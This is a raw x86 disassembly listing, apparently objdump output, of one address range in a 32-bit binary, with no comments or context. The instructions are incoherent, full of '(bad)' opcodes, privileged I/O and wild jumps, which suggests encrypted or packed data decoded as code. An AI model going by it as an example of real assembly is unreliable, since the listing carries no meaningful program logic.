  402129:	push   ss
  40212a:	add    esp,DWORD PTR [esi]
  40212c:	and    eax,0xfc99c642
  402131:	lds    ebp,FWORD PTR [edx]
  402133:	jnp    0x402108
  402135:	cmp    eax,0x89056e36
  40213a:	gs iret 
  40213c:	data16 (bad) 
  40213e:	ss ss cmc 
  402141:	sub    eax,0x738b299b
  402146:	cli    
  402147:	rol    DWORD PTR [ebp-0x21],1
  40214a:	std    
  40214b:	ds dec edx
  40214d:	sbb    eax,0x543f94b1
  402152:	mov    ebp,0xd0128efa
  402157:	sbb    DWORD PTR [ebx+ecx*8+0x9],esi
  40215b:	jmp    0x47fd2bc6
  402160:	dec    edx
  402161:	lahf   
  402162:	sub    al,0x1a
  402164:	enter  0xbd9d,0x3c
  402168:	lea    edi,[edi+ecx*8]
  40216b:	adc    DWORD PTR [ebx-0x4b],ebp
  40216e:	pushf  
  40216f:	hlt    
  402170:	stos   BYTE PTR es:[edi],al
  402171:	pop    ebp
  402172:	fisub  DWORD PTR [edi+0x43]
  402175:	jnp    0x402142
  402177:	sar    BYTE PTR [eax],1
  402179:	cdq    
  40217a:	test   BYTE PTR [edx-0x6e4ede65],0xad
  402181:	lods   eax,DWORD PTR ds:[esi]
  402182:	repz mov ds:0xe81b378e,eax
  402188:	(bad)  
  402189:	pushf  
  40218a:	dec    eax
  40218b:	bound  ebp,QWORD PTR [ecx+0x202e4459]
  402191:	cmp    al,0x58
  402193:	mov    eax,0x824662b7
  402198:	cmp    DWORD PTR [esi+0x65],0xffffffb8
  40219c:	daa    
  40219d:	adc    DWORD PTR [esi],ecx
  40219f:	inc    esi
  4021a0:	xor    dl,0x47
  4021a3:	push   ebp
  4021a4:	push   ebp
  4021a5:	pop    ecx
  4021a6:	dec    edx
  4021a7:	mov    ch,0xe1
  4021a9:	pop    ecx
  4021aa:	(bad)  
  4021ac:	push   ecx
  4021ad:	xor    al,0xb8
  4021af:	mov    ebx,fs
  4021b1:	jge    0x4021da
  4021b3:	aas    
  4021b4:	pop    edi
  4021b5:	lods   al,BYTE PTR ds:[esi]
  4021b6:	stos   BYTE PTR es:[edi],al
  4021b7:	imul   BYTE PTR [ebp+0x213add6f]
  4021bd:	jne    0x40217a
  4021bf:	js     0x4021aa
  4021c1:	in     eax,0x6a
  4021c3:	adc    al,0x56
  4021c5:	ret    
  4021c6:	pop    eax
  4021c7:	cmp    BYTE PTR [edx-0x4],bh
  4021ca:	inc    ebp
  4021cb:	mov    ds:0xf73bf2c4,al
  4021d0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4021d2:	push   0x16
  4021d4:	mov    al,0x31
  4021d6:	leave  
  4021d7:	jne    0x4021a4
  4021d9:	inc    ebx
  4021da:	int3   
  4021db:	mov    bl,ch
  4021dd:	sbb    eax,0x9be0be24
  4021e2:	jmp    0xc070067a
  4021e7:	(bad)  
  4021e8:	out    0x3,al
  4021ea:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4021ec:	mov    WORD PTR [eax],ds
  4021ee:	stos   DWORD PTR es:[edi],eax
  4021ef:	sahf   
  4021f0:	mov    esp,DWORD PTR [esi-0x7]
  4021f3:	pushf  
  4021f4:	jnp    0x4021f8
  4021f6:	jg     0x40223f
  4021f8:	mov    esp,0xfc9b9e99
  4021fd:	inc    edi
  4021fe:	fnstenv [eax+0x322e26b0]
  402204:	dec    esp
  402205:	bound  esi,QWORD PTR [ebp+0x4c]
  402208:	mov    al,0xd
  40220a:	dec    eax
  40220b:	fcom   QWORD PTR ss:[ebx]
  40220e:	sub    edi,ebx
  402210:	push   0x4f
  402212:	test   DWORD PTR [esi-0x555280be],ebp
  402218:	add    dl,ch
  40221a:	icebp  
  40221b:	cld    
  40221c:	inc    ecx
  40221d:	arpl   WORD PTR ds:0x5d39b029,cx
  402223:	(bad)  
  402224:	jmp    0x7532675e
  402229:	pop    ebx
  40222a:	jle    0x402200
  40222c:	pop    ss
  40222d:	mov    esi,0xfbd1ff34
  402232:	xor    BYTE PTR [eax-0x756d5b3f],ah
  402238:	add    DWORD PTR [esi+0x59eb3699],edx
  40223e:	adc    esi,DWORD PTR [ebp-0x64a1ae7f]
  402244:	outs   dx,DWORD PTR ds:[esi]
  402245:	mov    BYTE PTR [esi+0x4c],ch
  402248:	mov    dl,0xde
  40224a:	xchg   ecx,eax
  40224b:	addr16 push edi
  40224d:	js     0x40225d
  40224f:	icebp  
  402250:	add    al,0xb1
  402252:	adc    esp,DWORD PTR [ebx]
  402254:	fwait
  402255:	mov    bh,0xbf
  402257:	ja     0x402244
  402259:	cmp    eax,0x5562435
  40225e:	pop    ecx
  40225f:	adc    BYTE PTR [edx],dl
  402261:	pop    esi
  402262:	in     eax,dx
  402263:	out    dx,al
  402264:	sub    cl,BYTE PTR ds:0x262382f0
  40226a:	jg     0x4022a5
  40226c:	out    dx,al
  40226d:	imul   eax,ebp,0xdec2bac8
  402273:	push   ebp
  402274:	mov    ebx,0x4f608bb9
  402279:	(bad)  
  40227a:	enter  0x5b1b,0x2f
  40227e:	ja     0x402244
  402280:	(bad)  
  402281:	xchg   ebx,eax
  402282:	push   edx
  402283:	(bad)  [ecx]
  402285:	pop    ss
  402286:	xchg   ecx,eax
  402287:	cs ja  0x402250
  40228a:	inc    esp
  40228b:	or     dl,dl
  40228d:	adc    al,0x2a
  40228f:	push   ecx
  402290:	mov    ecx,0x80c0f3dd
  402295:	pusha  
  402296:	int3   
  402297:	cmp    al,0x26
  402299:	mov    dh,0x3b
  40229b:	add    DWORD PTR [edx-0x2e],esi
  40229e:	sub    eax,0x4a7298ef
  4022a3:	(bad)  
  4022a4:	push   ecx
  4022a5:	hlt    
  4022a6:	mov    BYTE PTR [ecx],cl
  4022a8:	cmp    eax,0x11805ba
  4022ad:	xchg   edx,eax
  4022ae:	shr    BYTE PTR [ebx],cl
  4022b0:	repz dec DWORD PTR [ebp-0x28]
  4022b4:	enter  0xdfb2,0xa0
  4022b8:	jae    0x402281
  4022ba:	jnp    0x4022ea
  4022bc:	jno    0x4022ec
  4022be:	xor    ebp,esi
  4022c0:	pusha  
  4022c1:	pop    es
  4022c2:	mov    edi,0x7f11f171
  4022c7:	sub    eax,0xdc3d5f22
  4022cc:	enter  0x8a8c,0xc2
  4022d0:	aaa    
  4022d1:	dec    ebx
  4022d2:	inc    esp
  4022d3:	(bad)
  4022d6:	xchg   ebp,eax
  4022d7:	iret   
  4022d8:	cmc    
  4022d9:	pop    edi
  4022da:	adc    BYTE PTR [eax],ch
  4022dc:	mov    cl,0xe
  4022de:	push   ds
  4022df:	aad    0x4c
  4022e1:	xchg   esp,eax
  4022e2:	xchg   DWORD PTR [ebp-0x20cc329f],esi
  4022e8:	mov    ah,0xa9
  4022ea:	jle    0x4022a1
  4022ec:	ja     0x402317
  4022ee:	push   ebp
  4022ef:	leave  
  4022f0:	mov    ecx,0xb08d0eb0
  4022f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f6:	xchg   edi,eax
  4022f7:	int    0xde
  4022f9:	not    BYTE PTR ds:0xdcf6e063
  4022ff:	mov    al,ds:0x7f30b4fc
  402304:	pop    eax
  402305:	xchg   ebx,eax
  402306:	pop    edi
  402307:	sbb    al,0x8b
  402309:	cld    
  40230a:	call   FWORD PTR ds:0x1648
  40230f:	popa   
  402310:	and    DWORD PTR [esi+esi*4+0x1d228301],0xffffff9b
  402318:	pop    edi
  402319:	xchg   BYTE PTR [ebx-0x3ace577c],al
  40231f:	mov    eax,ds:0x75a500c7
  402324:	stc    
  402325:	setae  BYTE PTR [eax-0x20d6c5c]
  40232c:	or     DWORD PTR [ecx+ebx*4+0xb0d3e6e],edx
  402333:	into   
  402334:	nop
  402335:	mov    DWORD PTR [esi-0x664e9c53],ecx
  40233b:	(bad)  
  40233d:	xchg   esi,eax
  40233e:	out    0xcb,al
  402340:	add    cl,ah
  402342:	inc    esi
  402343:	push   0x6a
  402345:	lahf   
  402346:	(bad)  
  402347:	mov    dl,0x6b
  402349:	jae    0x77ac1d37
  40234f:	outs   dx,BYTE PTR ds:[esi]
  402350:	sub    bl,BYTE PTR ds:0x85e450a6
  402356:	repz pushf 
  402358:	sub    esi,DWORD PTR [ecx+0x36]
  40235b:	lods   eax,DWORD PTR ds:[esi]
  40235c:	and    DWORD PTR ds:0xadf3fbee,esi
  402362:	jg     0x40238d
  402364:	xor    BYTE PTR [edi+0x7c1e5a42],cl
  40236a:	xchg   ebx,eax
  40236b:	push   0x7e84c04b
  402370:	xchg   DWORD PTR [edi+0x13c23194],ebp
  402376:	inc    BYTE PTR [ebx]
  402378:	jmp    0x4023f0
  40237a:	ds mov al,0x92
  40237d:	div    DWORD PTR gs:[edx+0x165230f0]
  402384:	in     al,dx
  402385:	mov    cl,0x5e
  402387:	push   ss
  402388:	mov    cl,0x5d
  40238a:	(bad)  
  40238b:	sahf   
  40238c:	iret   
  40238d:	and    eax,0xf81f4316
  402392:	cmp    esi,DWORD PTR [edx]
  402394:	dec    ebp
  402395:	pop    esi
  402396:	cdq    
  402397:	retf   0xc02c
  40239a:	mov    eax,ds:0xbaf95ef6
  40239f:	stc    
  4023a0:	mov    dl,0xb4
  4023a2:	test   al,0xfb
  4023a4:	cdq    
  4023a5:	pop    ss
  4023a6:	dec    ebp
  4023a7:	out    dx,eax
  4023a8:	inc    eax
  4023a9:	adc    edx,DWORD PTR [eax]
  4023ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023ac:	or     BYTE PTR [ebx-0x13],bh
  4023af:	mov    ebx,0x5d13b5af
  4023b4:	push   ecx
  4023b5:	mov    bh,0x63
  4023b7:	pop    eax
  4023b8:	push   ecx
  4023b9:	dec    edi
  4023ba:	and    DWORD PTR [esi-0x19f392e1],0x9f08e5c1
  4023c4:	(bad)  
  4023c5:	adc    dh,BYTE PTR [eax-0x5d]
  4023c8:	jle    0x402414
  4023ca:	shl    DWORD PTR [ebx+eiz*2],0xc1
  4023ce:	in     al,0x9a
  4023d0:	cmp    BYTE PTR [ecx],bl
  4023d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023d3:	fild   QWORD PTR [ebx-0x38c0f352]
  4023d9:	and    DWORD PTR [edi],ecx
  4023db:	or     cl,0xc0
  4023de:	inc    eax
  4023df:	pop    es
  4023e0:	mov    ecx,0xfe63b728
  4023e5:	add    eax,0x23dcefed
  4023ea:	hlt    
  4023eb:	outs   dx,BYTE PTR ds:[esi]
  4023ec:	cmp    ch,BYTE PTR [ebp-0x4343162d]
  4023f2:	jne    0x40246d
  4023f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023f5:	jge    0x402432
  4023f7:	adc    eax,ebp
  4023f9:	pop    eax
  4023fa:	outs   dx,DWORD PTR ds:[esi]
  4023fb:	lock sbb al,0x45
  4023fe:	out    dx,eax
  4023ff:	sbb    dh,BYTE PTR [eax-0x4c]
  402402:	adc    BYTE PTR ds:0x7e6b94ed,al
  402408:	nop
  402409:	xor    DWORD PTR [esp+ebp*4+0x7043aa32],esi
  402410:	fs ins DWORD PTR es:[edi],dx
  402412:	mov    ds:0x23589853,al
  402417:	ficom  DWORD PTR [esi-0x73]
  40241a:	dec    ebp
  40241b:	pop    ecx
  40241c:	cmp    DWORD PTR [esi],0x79
  40241f:	iret   
  402420:	mov    ecx,0x5d32e13e
  402425:	fwait
  402426:	pop    ss
  402427:	push   esp
  402428:	int    0xb9
  40242a:	pop    esp
  40242b:	push   0x8659bed1
  402430:	mov    eax,esp
  402432:	sub    dl,bh
  402434:	sub    eax,0xb9484d9d
  402439:	push   ebp
  40243a:	aam    0x19
  40243c:	push   eax
  40243d:	dec    edi
  40243e:	jge    0x4023ea
  402440:	xchg   DWORD PTR [ecx-0xd753a0f],edi
  402446:	xchg   esi,eax
  402447:	mov    ecx,0x1027dbdd
  40244c:	(bad)  
  40244d:	shl    BYTE PTR [ebx+0x19],cl
  402450:	push   edi
  402451:	add    al,0xba
  402453:	xchg   edi,eax
  402454:	mov    ds:0xd4f4da01,eax
  402459:	in     al,dx
  40245a:	fs inc ecx
  40245c:	push   ds
  40245d:	iret   
  40245e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40245f:	pusha  
  402460:	loopne 0x4024b6
  402462:	fidiv  DWORD PTR [esi-0x6a]
  402465:	mov    ebp,es
  402467:	inc    ebp
  402468:	push   0x4b08b56
  40246d:	test   eax,0x287cea9b
  402472:	cmc    
  402473:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402475:	dec    eax
  402476:	add    BYTE PTR [edi-0x7a],ch
  402479:	das    
  40247a:	push   es
  40247b:	nop
  40247c:	or     eax,0x388fe6bb
  402481:	or     DWORD PTR [edx+ecx*4],esi
  402484:	imul   ecx,DWORD PTR [eax],0x653b1d63
  40248a:	xchg   ecx,eax
  40248b:	loop   0x4024eb
  40248d:	mov    ah,0xc4
  40248f:	inc    ebp
  402490:	mov    al,ds:0x6c2ffc1
  402495:	xchg   esi,eax
  402496:	mov    edx,0xb424a6b9
  40249b:	nop
  40249c:	shr    BYTE PTR [edi+edx*8+0x2e],cl
  4024a0:	adc    al,0x77
  4024a2:	add    DWORD PTR [esp+edi*1-0x77],0xe3551a4c
  4024aa:	stos   DWORD PTR es:[edi],eax
  4024ab:	mov    BYTE PTR [ebx],al
  4024ad:	rcr    BYTE PTR [ecx],1
  4024af:	push   edx
  4024b0:	sbb    ecx,DWORD PTR [edi+0xd9b28cb]
  4024b6:	out    dx,eax
  4024b7:	jno    0x40249a
  4024b9:	fsub   DWORD PTR [edx-0x521f261e]
  4024bf:	mov    edi,0x9439e405
  4024c4:	and    bh,dh
  4024c6:	push   edx
  4024c7:	(bad)  
  4024c8:	js     0x402534
  4024ca:	mov    fs,WORD PTR [edx+edi*2+0x5d]
  4024ce:	xchg   esi,eax
  4024cf:	pushf  
  4024d0:	xchg   edi,eax
  4024d1:	daa    
  4024d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024d3:	jp     0x402513
  4024d5:	jle    0x402547
  4024d7:	pop    ebx
  4024d8:	push   ebp
  4024d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024da:	les    esi,FWORD PTR [ebx-0x6]
  4024dd:	(bad)  
  4024de:	xchg   ebx,eax
  4024df:	add    ebp,eax
  4024e1:	in     al,dx
  4024e2:	test   bl,ch
  4024e4:	sub    bl,bh
  4024e6:	pop    edi
  4024e7:	adc    BYTE PTR [edi-0x24734f22],0x50
  4024ee:	icebp  
  4024ef:	sbb    eax,0x5ee56ff7
  4024f4:	mov    al,ds:0x602e3fb0
  4024f9:	in     al,dx
  4024fa:	lods   eax,DWORD PTR ds:[esi]
  4024fb:	out    0x43,eax
  4024fd:	je     0x402485
  4024ff:	call   0x97cb6b00
  402504:	shl    ebp,cl
  402506:	mov    esi,0x69513911
  40250b:	arpl   WORD PTR [ebx+ebx*8],sp
  40250e:	ficomp WORD PTR [ecx-0x1e]
  402511:	add    eax,0x36f44af4
  402516:	push   edx
  402517:	mov    bh,0x5f
  402519:	add    al,0xa8
  40251b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40251c:	or     al,0x62
  40251e:	or     bl,dh
  402520:	sub    al,0x2a
  402522:	mov    ebp,0xc91c349a
  402527:	ret    
  402528:	adc    eax,edx
  40252a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252b:	stos   DWORD PTR es:[edi],eax
  40252c:	rcr    DWORD PTR [ebx+0x28],0x27
  402530:	(bad)  
  402531:	mov    bh,0x61
  402533:	add    DWORD PTR [ebp+eax*8+0x3abe830c],esi
  40253a:	dec    esi
  40253b:	jecxz  0x40255f
  40253d:	dec    esp
  40253e:	sub    BYTE PTR [ebp-0x6663bc24],0x6f
  402545:	gs pop edx
  402547:	inc    eax
  402548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402549:	mov    bh,BYTE PTR [ebx+0xd]
  40254c:	sar    ebx,cl
  40254e:	dec    di
  402550:	mov    ds:0x41ad23f1,al
  402555:	pusha  
  402556:	xor    al,0x86
  402558:	inc    ebx
  402559:	jb     0x402558
  40255b:	mov    edx,0x2cd0dbd5
  402560:	mov    ebp,0x6fdc087b
  402565:	repnz mov ds:0x5752980c,al
  40256b:	int3   
  40256c:	or     al,BYTE PTR [ebx+0x1c7aa87b]
  402572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402573:	mov    ah,0xa9
  402575:	fmul   DWORD PTR [ebp+0x1a]
  402578:	adc    bl,BYTE PTR [ebx]
  40257a:	or     ah,0xb
  40257d:	sbb    BYTE PTR [eax-0x6e80915],dh
  402583:	pop    esp
  402584:	int3   
  402585:	out    0xfa,eax
  402587:	push   edi
  402588:	inc    esp
  402589:	inc    esi
  40258a:	inc    esp
  40258b:	inc    esp
  40258c:	(bad)
  402591:	out    0xf7,eax
  402593:	in     al,dx
  402594:	xor    ecx,DWORD PTR [eax+edi*4]
  402597:	xor    DWORD PTR [edi],edi
  402599:	xchg   edx,eax
  40259a:	in     eax,0x7b
  40259c:	xlat   BYTE PTR ds:[ebx]
  40259d:	call   0xd3416e6f
  4025a2:	sub    dl,BYTE PTR [edx+edi*8]
  4025a5:	sub    eax,0x486fbcbd
  4025aa:	cmp    al,BYTE PTR [ebp-0x44]
  4025ad:	mov    bl,0xb5
  4025af:	int3   
  4025b0:	(bad)  
  4025b1:	adc    dh,al
  4025b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025b4:	inc    esp
  4025b5:	inc    eax
  4025b6:	data16 (bad) 
  4025b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b9:	fisttp WORD PTR [eax]
  4025bb:	xchg   ebp,eax
  4025bc:	mov    ecx,0x39fda9a2
  4025c1:	(bad)  
  4025c2:	and    BYTE PTR [edx],dl
  4025c4:	das    
  4025c5:	fcmovnb st,st(2)
  4025c7:	jns    0x40258a
  4025c9:	xchg   edi,eax
  4025ca:	or     eax,eax
  4025cc:	mov    esi,0x55994a7
  4025d1:	pop    ecx
  4025d2:	in     eax,dx
  4025d3:	test   al,0x1b
  4025d5:	and    dh,BYTE PTR [edi-0x12]
  4025d8:	mov    al,0x82
  4025da:	mov    al,0xeb
  4025dc:	mul    BYTE PTR [ebp+0x6c940f4c]
  4025e2:	hlt    
  4025e3:	repz or al,0x86
  4025e6:	jne    0x4025b5
  4025e8:	call   0xa08b49b
  4025ed:	loopne 0x402650
  4025ef:	lahf   
  4025f0:	push   ss
  4025f1:	inc    edx
  4025f2:	xchg   esi,eax
  4025f3:	and    ch,BYTE PTR [ecx+eax*4+0x7be1d0c4]
  4025fa:	out    0x2d,al
  4025fc:	stos   DWORD PTR es:[edi],eax
  4025fd:	es inc edi
  4025ff:	cmp    al,BYTE PTR [ecx+0x1c]
  402602:	xchg   edx,eax
  402603:	inc    ebx
  402604:	inc    ebp
  402605:	sub    eax,0x9b7ae5af
  40260a:	fwait
  40260b:	int3   
  40260c:	jno    0x402669
  40260e:	(bad)
  402612:	sar    BYTE PTR [ebx+0x14],0x7
  402616:	dec    ecx
  402617:	mov    ds:0x8a620048,eax
  40261c:	push   0xb463ad03
  402621:	jmp    0x402630
  402623:	int3   
  402624:	add    bh,bh
  402626:	les    esi,FWORD PTR [esi]
  402628:	call   0x7acd:0x419ca499
  40262f:	push   0x3b0232d8
  402634:	push   ecx
  402635:	cmp    DWORD PTR [eax+0x7b],0x5a
  402639:	sahf   
  40263a:	dec    edx
  40263b:	les    ecx,FWORD PTR [ebp+0x2c]
  40263e:	add    al,0x50
  402640:	jae    0x402622
  402642:	mov    al,0xb
  402644:	jae    0x402695
  402646:	mov    cl,0x15
  402648:	iret   
  402649:	xor    ch,bl
  40264b:	fwait
  40264c:	add    eax,0x8320e3f6
  402651:	mov    DWORD PTR [ebx],ebx
  402653:	cmc    
  402654:	mov    gs,WORD PTR [ebx]
  402656:	leave  
  402657:	adc    al,0x81
  402659:	inc    eax
  40265a:	pop    es
  40265b:	mov    bh,0x96
  40265d:	shr    DWORD PTR [edi-0x33fe425e],cl
  402663:	sbb    al,0xe7
  402665:	addr16 dec ebp
  402667:	fadd   DWORD PTR ds:0x47d90a32
  40266d:	mov    eax,0x86d1b82c
  402672:	jo     0x4026c3
  402674:	xor    ecx,edi
  402676:	nop
  402677:	in     eax,0x54
  402679:	mov    eax,0x1db342c7
  40267e:	and    esp,eax
  402680:	popf   
  402681:	rcr    BYTE PTR [ecx],0x0
  402684:	mov    dl,BYTE PTR [esi+0x3a]
  402687:	out    dx,eax
  402688:	mov    al,0x2e
  40268a:	or     dl,BYTE PTR [ebx+0x60c0110f]
  402690:	push   0x51690771
  402695:	add    BYTE PTR [esi+0x4],0x86
  402699:	aam    0x3
  40269b:	sub    bl,BYTE PTR [ebx-0x7ea82d23]
  4026a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a2:	div    DWORD PTR [ebx+0x61a95bfd]
  4026a8:	dec    edi
  4026a9:	lods   al,BYTE PTR ds:[esi]
  4026aa:	frstor [ebx]
  4026ac:	push   edi
  4026ad:	test   al,0x70
  4026af:	mov    ds:0x72a0c7ff,al
  4026b4:	jbe    0x402639
  4026b6:	aaa    
  4026b7:	neg    DWORD PTR [esi+0x5a6a6ae7]
  4026bd:	pop    eax
  4026be:	xor    edx,DWORD PTR [edi-0x73]
  4026c1:	hlt    
  4026c2:	xor    eax,DWORD PTR [ebp+edi*1+0x2b74c48a]
  4026c9:	loope  0x402702
  4026cb:	test   DWORD PTR [edi],eax
  4026cd:	sbb    bl,ch
  4026cf:	adc    eax,0x48c52f2a
  4026d4:	lods   eax,DWORD PTR ds:[esi]
  4026d5:	fwait
  4026d6:	lea    eax,[esi]
  4026d8:	pop    edx
  4026d9:	arpl   WORD PTR [edi],di
  4026db:	dec    esi
  4026dc:	fwait
  4026dd:	loopne 0x402667
  4026df:	push   ss
  4026e0:	pushf  
  4026e1:	push   ebx
  4026e2:	popf   
  4026e3:	mov    DWORD PTR [ebx],edi
  4026e5:	jg     0x40274d
  4026e7:	jge    0x40267a
  4026e9:	and    eax,0x9d90943e
  4026ee:	cmc    
  4026ef:	xchg   edx,eax
  4026f0:	xor    DWORD PTR [edx-0x2f8e73ab],ebp
  4026f6:	dec    ebp
  4026f7:	cs dec ecx
  4026f9:	fsub   st(2),st
  4026fb:	jo     0x4026e6
  4026fd:	cmp    eax,0x7da92a6e
  402702:	popa   
  402703:	mov    bh,ah
  402705:	lods   al,BYTE PTR ds:[esi]
  402706:	in     eax,0xd0
  402708:	sbb    edx,ebx
  40270a:	iret   
  40270b:	mov    eax,0x1290e4e1
  402710:	mov    al,ds:0x37266cef
  402715:	pop    ds
  402716:	adc    DWORD PTR [ebx],ebp
  402718:	jmp    0x5a2bb13f
  40271d:	neg    BYTE PTR [edx+0x1d9adbde]
  402723:	xchg   edx,eax
  402724:	aam    0x9a
  402726:	sub    DWORD PTR [ebx+0x5],0x2ea4a5d7
  40272d:	dec    esi
  40272e:	dec    edi
  40272f:	xor    eax,0x925a8b93
  402734:	push   0x1fb48af3
  402739:	gs gs loopne 0x402749
  40273d:	sti    
  40273e:	adc    eax,0xc151a00
  402743:	pop    es
  402744:	cld    
  402745:	loopne 0x4027a2
  402747:	mov    ch,BYTE PTR [eax+eiz*8-0x4e0f55fb]
  40274e:	ss sbb eax,0xf22fd497
  402754:	xor    cl,ch
  402756:	pop    ebx
  402757:	fwait
  402758:	hlt    
  402759:	adc    DWORD PTR [esi],ebp
  40275b:	stos   BYTE PTR es:[edi],al
  40275c:	xor    DWORD PTR [esi-0x2f9ed101],eax
  402762:	jp     0x40277d
  402764:	mov    ebp,0xd606a288
  402769:	loope  0x402701
  40276b:	fld    DWORD PTR ds:0x38cf300d
  402772:	hlt    
  402773:	scas   al,BYTE PTR es:[edi]
  402774:	and    esi,DWORD PTR [ecx+0x4a]
  402777:	push   esi
  402778:	lods   al,BYTE PTR ds:[esi]
  402779:	data16 je 0x4027c5
  40277c:	inc    esp
  40277d:	xchg   edi,eax
  40277e:	dec    ebp
  40277f:	repnz dec esi
  402781:	jb     0x40274c
  402783:	and    al,0x11
  402785:	dec    ebp
  402786:	rol    BYTE PTR [ebx+0x6d],0xd8
  40278a:	or     DWORD PTR [ecx-0x7c],ecx
  40278d:	ss in  al,dx
  40278f:	push   eax
  402790:	or     BYTE PTR [edi],dh
  402792:	leave  
  402793:	push   esp
  402794:	jns    0x4027bf
  402796:	inc    edi
  402797:	mov    WORD PTR [ecx+edi*2-0x42c1ff45],?
  40279e:	jae    0x40275d
  4027a0:	ret    
  4027a1:	ret    0x3e73
  4027a4:	sbb    esi,ebp
  4027a6:	jg     0x402756
  4027a8:	push   0xffffffdd
  4027aa:	dec    ecx
  4027ab:	jne    0x40275a
  4027ad:	sub    DWORD PTR [ebp+0x649b9f1b],eax
  4027b3:	mov    ds:0xf3f812dd,eax
  4027b8:	popf   
  4027b9:	mov    eax,DWORD PTR [ebx+0x48956967]
  4027bf:	stc    
  4027c0:	mov    edi,DWORD PTR [eax]
  4027c2:	aad    0xcd
  4027c4:	sbb    BYTE PTR [eax-0x5bd24ddd],al
  4027ca:	pop    ebx
  4027cb:	push   esi
  4027cc:	lock dec esi
  4027ce:	xor    eax,0x795dfe1e
  4027d3:	pop    edi
  4027d4:	inc    eax
  4027d5:	and    DWORD PTR [eax],ebp
  4027d7:	mov    ds,WORD PTR ds:0x72821c97
  4027dd:	ins    DWORD PTR es:[edi],dx
  4027de:	loopne 0x4027f2
  4027e0:	scas   eax,DWORD PTR es:[edi]
  4027e1:	mov    WORD PTR [ebp-0x4d95181b],?
  4027e7:	sbb    bh,BYTE PTR [edi+0x10]
  4027ea:	cmp    eax,DWORD PTR [esi-0x7d445bdc]
  4027f0:	add    esp,esi
  4027f2:	xchg   DWORD PTR fs:[ecx],esi
  4027f5:	pop    ss
  4027f6:	xchg   ecx,esi
  4027f8:	adc    al,0xe7
  4027fa:	xchg   BYTE PTR [ecx],dl
  4027fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027fd:	sahf   
  4027fe:	inc    ecx
  4027ff:	scas   eax,DWORD PTR es:[edi]
  402800:	out    0xfb,al
  402802:	int    0x30
  402804:	daa    
  402805:	shrd   DWORD PTR [eax],ebx,0xe8
  402809:	popf   
  40280a:	shl    BYTE PTR [edx+0x18361b1e],cl
  402810:	iret   
  402811:	xchg   esi,eax
  402812:	(bad)  
  402813:	out    0xa9,al
  402815:	lods   eax,DWORD PTR ds:[esi]
  402816:	aaa    
  402817:	jo     0x402842
  402819:	int    0x2
  40281b:	lods   eax,DWORD PTR ds:[esi]
  40281c:	bsf    ebp,DWORD PTR [eax+0x2bff197a]
  402823:	pop    ecx
  402824:	cmp    bh,0x59
  402827:	inc    edi
  402828:	xor    BYTE PTR [esi-0x645f8102],dh
  40282e:	and    bh,BYTE PTR [ebx]
  402830:	daa    
  402831:	std    
  402832:	scas   al,BYTE PTR es:[edi]
  402833:	pop    edx
  402834:	into   
  402835:	loope  0x4028ac
  402837:	xor    DWORD PTR [ebx-0x7],ebx
  40283a:	retf   0x4cac
  40283d:	sbb    ah,al
  40283f:	xor    eax,0xb3db2aa9
  402844:	and    ebx,DWORD PTR [ebx-0x26bc5f34]
  40284a:	sbb    DWORD PTR [ecx+0x57fceffe],esp
  402850:	mov    WORD PTR [eax+0x63ed09eb],ss
  402856:	into   
  402857:	cmp    cl,bl
  402859:	loopne 0x4028bf
  40285b:	mov    edi,0x90619859
  402860:	stos   BYTE PTR es:[edi],al
  402861:	push   0x13
  402863:	and    esp,edi
  402865:	loopne 0x4027ef
  402867:	pop    DWORD PTR [edx+0x1f]
  40286a:	mov    ebp,0x1b87a625
  40286f:	pop    es
  402870:	leave  
  402871:	ret    0xbf87
  402874:	push   0xc711e3a4
  402879:	sbb    DWORD PTR [ecx-0x19],eax
  40287c:	inc    ebp
  40287d:	dec    edi
  40287e:	fsub   QWORD PTR [esi-0x6ba5cfb3]
  402884:	sub    DWORD PTR [edi-0x7c],ebp
  402887:	dec    esp
  402888:	test   DWORD PTR [ebp+0x56],0xe122002
  40288f:	push   edx
  402890:	xchg   ebp,eax
  402891:	sub    ch,BYTE PTR ds:0x3fca3299
  402897:	ss xchg ebx,eax
  402899:	sbb    bl,BYTE PTR [esi+ecx*4-0x33]
  40289d:	xchg   ebp,eax
  40289e:	div    ch
  4028a0:	mov    edx,0x84e06c15
  4028a5:	or     DWORD PTR [esi-0x39da6907],0x72
  4028ac:	push   ds
  4028ad:	cmp    bl,BYTE PTR [edx-0x24]
  4028b0:	inc    ebp
  4028b1:	xchg   ebp,eax
  4028b2:	or     eax,0x5157d072
  4028b7:	xchg   esp,eax
  4028b8:	pop    ecx
  4028b9:	int3   
  4028ba:	mov    ebx,0xa103e802
  4028bf:	sub    al,BYTE PTR [eax]
  4028c1:	(bad)  
  4028c2:	in     eax,dx
  4028c3:	daa    
  4028c4:	cmp    esp,DWORD PTR [edi+0x1f]
  4028c7:	std    
  4028c8:	mov    esi,DWORD PTR ds:0xa43e31bd
  4028ce:	jmp    0xe3f2:0xf27c45c3
  4028d5:	test   eax,0x796ed9e7
  4028da:	sub    eax,0x2a30ec32
  4028df:	pusha  
  4028e0:	cld    
  4028e1:	and    al,0x14
  4028e3:	sbb    BYTE PTR [eax],dh
  4028e5:	sbb    BYTE PTR [ecx+ecx*2-0x70e161b9],ch
  4028ec:	aam    0x2
  4028ee:	add    DWORD PTR [esi+ebp*8+0x6f],ecx
  4028f2:	xor    eax,0x8fb7065c
  4028f7:	mov    ds:0x156d3acc,eax
  4028fc:	dec    ebx
  4028fd:	push   ss
